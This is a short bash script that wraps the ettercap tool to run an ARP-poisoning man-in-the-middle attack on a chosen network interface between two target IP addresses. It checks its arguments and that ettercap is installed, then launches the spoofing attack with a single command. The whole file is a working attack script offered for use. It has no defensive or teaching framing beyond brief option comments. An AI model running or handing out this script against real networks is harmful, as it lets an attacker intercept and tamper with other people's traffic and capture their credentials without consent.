#!/bin/bash
# Ettercap - Man-in-the-Middle Attack
# Options:
# -T : Text-only mode
# -q : Quiet mode
# -i : Interface to use

# Usage: ettercap_mitm.sh <interface> <target1_ip> <target2_ip>
# Example script
# ettercap_mitm.sh eth0 192.168.1.10 192.168.1.1

# Check if ettercap is installed
if ! command -v ettercap &> /dev/null
then
    echo "ettercap could not be found, please install it first."
    exit
fi

# Ensure parameters are provided
if [ "$#" -ne 3 ]; then
    echo "Usage: $0 <interface> <target1_ip> <target2_ip>"
    exit 1
fi

INTERFACE=$1
TARGET1=$2
TARGET2=$3

echo "Starting MITM attack on interface $INTERFACE between $TARGET1 and $TARGET2"

# Perform MITM attack
ettercap -T -q -i $INTERFACE -M arp:remote /$TARGET1// /$TARGET2//

echo "MITM attack completed."
